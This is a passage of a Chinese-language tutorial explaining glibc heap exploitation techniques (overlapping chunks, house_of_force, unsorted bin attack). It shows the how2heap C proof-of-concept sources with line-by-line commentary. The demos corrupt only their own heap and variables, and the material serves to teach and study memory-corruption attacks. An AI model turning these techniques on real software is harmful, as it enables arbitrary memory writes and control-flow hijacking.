    p2 = malloc(1000);
    p3 = malloc(1000);
    p4 = malloc(1000);
    p5 = malloc(1000);
    free(p4);
因为p5的存在所以p4不会被合并。
然后我们在p1触发一个溢出，将p2的size改写成p2和p3大小的和。
之后free(p2)的时候，分配器就会认为p4是下一个块（忽略p3）。
然后就会错误地将p3和p2合并。
    p6 = malloc(2000);
这时返回给p6的地址就是p2的地址了，p6内部也包含了未被free的p3。
我们可以愉快地通过p6来改写p3中的任何数据。
这个例程介绍的是获得overlapping chunk的另外一种方法。
上面那种方法是在chunk已经被free的情况下直接修改size字段，然后将chunk malloc出来。
这个例程是在chunk被free之前，通过修改size，然后free，欺骗free函数去修改了下一个chunk的presize字段来强行“合并”堆块。
这里就是设置了p2的size为p2和p3大小的和，之后更新presize的时候是通过p2的地址加上p2的size来寻找的要修改的位置的，这里刚好就把p4头部的presize给改掉了。
之后的malloc也顺理成章地将p2和p3作为一块内存分配给我们了，尽管p3没有被free。
**0x08 house_of_force**
****
**源码：**
    /*
       This PoC works also with ASLR enabled.
       It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
       If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
       ( http://phrack.org/issues/66/10.html )
       Tested in Ubuntu 14.04, 64bit.
    */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char bss_var[] = "This is a string that we want to overwrite.";
    int main(int argc , char* argv[])
    {
      printf("nWelcome to the House of Forcenn");
      printf("The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.n");
      printf("The top chunk is a special chunk. Is the last in memory "
          "and is the chunk that will be resized when malloc asks for more space from the os.n");
      printf("nIn the end, we will use this to overwrite a variable at %p.n", bss_var);
      printf("Its current value is: %sn", bss_var);
      printf("nLet's allocate the first chunk, taking space from the wilderness.n");
      intptr_t *p1 = malloc(256);
      printf("The chunk of 256 bytes has been allocated at %p.n", p1);
      printf("nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.n");
      int real_size = malloc_usable_size(p1);
      printf("Real size (aligned and all that jazz) of our allocated chunk is %d.n", real_size);
      printf("nNow let's emulate a vulnerability that can overwrite the header of the Top Chunkn");
      //----- VULNERABILITY ----      intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
      printf("nThe top chunk starts at %pn", ptr_top);
      printf("nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.n");
       printf("Old size of top chunk %#llxn", *((unsigned long long int *)ptr_top));
      ptr_top[0] = -1;
      printf("New size of top chunk %#llxn", *((unsigned long long int *)ptr_top));
        //------------------------    
      printf("nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.n"
           "Next, we will allocate a chunk that will get us right up against the desired region (with an integer "
           "overflow) and will then be able to allocate a chunk right over the desired region.n");
      unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
      printf("nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
           "we will malloc %#lx bytes.n", bss_var, ptr_top, evil_size);
      void *new_ptr = malloc(evil_size);
      printf("As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr);
      void* ctr_chunk = malloc(100);
      printf("nNow, the next chunk we overwrite will point at our target buffer.n");
      printf("malloc(100) => %p!n", ctr_chunk);
      printf("Now, we can finally overwrite that value:n");
      printf("... old string: %sn", bss_var);
      printf("... doing strcpy overwrite with "YEAH!!!"...n");
      strcpy(ctr_chunk, "YEAH!!!");
      printf("... new string: %sn", bss_var);
      // some further discussion:
      //printf("This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessednn");
      //printf("This because the main_arena->top pointer is setted to current av->top + malloc_size "
      //    "and we nwant to set this result to the address of malloc_got_address-8nn");
      //printf("In order to do this we have malloc_got_address-8 = p2_guessed + evil_sizenn");
      //printf("The av->top after this big malloc will be setted in this way to malloc_got_address-8nn");
      //printf("After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
      //    "nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_addressnn");
      //printf("The large chunk with evil_size has been allocated here 0x%08xn",p2);
      //printf("The main_arena value av->top has been setted to malloc_got_address-8=0x%08xn",malloc_got_address);
      //printf("This last malloc will be served from the remainder code and will return the av->top+8 injected beforen");
    }
**翻译：**
**house_of_force** 的主要思想是，通过改写top chunk来使malloc返回任意地址。
top chunk是一块非常特殊的内存，它存在于堆区的最后，而且一般情况下，当malloc向os申请内存时，top chunk的大小会变动。
我们就利用这个机制来改写一个变量
    char bss_var[]= "This is a string that we want to overwrite.";
先分配第一个chunk：
    intptr_t *p1 = malloc(256);
现在heap区域就存在了两个chunk一个是p1,一个是top chunk。
p1的真实大小应该是 0x100 + 0x8
现在模拟一个漏洞，改写top chunk的头部，top chunk的起始地址为：
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
用一个很大的值来改写top chunk的size，以免等一下申请内存的时候使用 **mmap** 来分配：
    ptr_top[0] = -1;
改写之后top chunk的size=0xFFFFFFFF。
现在top chunk变得非常大，我们可以malloc一个在此范围内的任何大小的内存而不用调用mmap。
接下来malloc一个chunk，使得这个chunk刚好分配到我们想控制的那块区域为止，然后我们就可以malloc出我们想控制的区域了。
比如：我们想要改写的变量位置在0x602060，top chunk 的位置在0x127b528，再算上head的大小，我们将要malloc
0xffffffffff386b28 个字节。
新申请的这个chunk开始于原来top chunk所处的位置。
而此时top chunk已经处在0x602050了，之后再malloc就会返回一个包含我们想要改写的变量的chunk了。
这个例程和它的名字一样暴力，直接对top chunk下手，想法很大胆的一种攻击方式。
首先是修改top chunk的size字段为-1（在x64机器上实际大小就为0xFFFFFFFF）
然后malloc一个很大的值 **Large** ，L的计算就是用你想控制的地址的值 **Ctrl** 减去top地址的值 **Top** ，那么Large
= Ctrl – Top 。
    malloc(Large);
用malloc申请了这个chunk之后top chunk是这样的：
这个技巧的利用效果就是，我们可以用malloc返回一个heap区域之前的地址。
**0x09 unsorted_bin_attack**
****
源码：
    #include 
    #include 
    int main(){
        printf("This file demonstrates unsorted bin attack by write a large unsigned long value into stackn");
        printf("In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
               "global variable global_max_fast in libc for further fastbin attacknn");
        unsigned long stack_var=0;
        printf("Let's first look at the target we want to rewrite on stack:n");
        printf("%p: %ldnn", &stack_var, stack_var);
        unsigned long *p=malloc(400);
        printf("Now, we allocate first normal chunk on the heap at: %pn",p);
        printf("And allocate another normal chunk in order to avoid consolidating the top chunk with"
               "the first one during the free()nn");
        malloc(500);
        free(p);
        printf("We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
               "point to %pn",(void*)p[1]);
        //------------VULNERABILITY-----------        p[1]=(unsigned long)(&stack_var-2);
        printf("Now emulating a vulnerability that can overwrite the victim->bk pointern");
        printf("And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
        //------------------------------------        malloc(400);
        printf("Let's malloc again to get the chunk we just free. During this time, target should has already been "
               "rewrite:n");
        printf("%p: %pn", &stack_var, (void*)stack_var);
    }
**翻译：**
这个例程通过unsortedbin攻击往栈中写入一个unsigned long的值。
在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。
比如，我们在栈上有一个栈单元stack_var需要被改写
    unsigned long stack_var=0;
然后正常地分配一个chunk。
    unsigned long *p=malloc(400);
再分配一个，防止前一个chunk在free的时候被合并了。
    malloc(500);
然后
    free(p);
之后p会被插入到unsortedbin链表中，而且它的fd和bk都指向unsortedbin的head。
接着我们模拟一个漏洞攻击改写p的bk指针：
    p[1]=(unsigned long)(&stack_var-2);
然后用malloc出发unsortedbin的unlink：
    malloc(400);
然后 **stack_var** 的值就被改写成了unsortedbin的head的地址了。
这也算是unlink的另一种用法，上一篇的总结中， **unsafe_unlink**
通过unlink来直接控制地址，这里则是通过unlink来泄漏libc的信息，来进行进一步的攻击。流程也较为简单。
和 **house_of_lore**
操作有点像，也是通过修改victim的bk字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。
**0x0A 写在最后**
****
个人水平有限，加上总结的时候有一些不太重要的点被我选择性地忽略了，如果有疑问请在下面留言。
最后一个例程 **house_of_einherjar** 在新版glibc已经不能用了，所以不做介绍。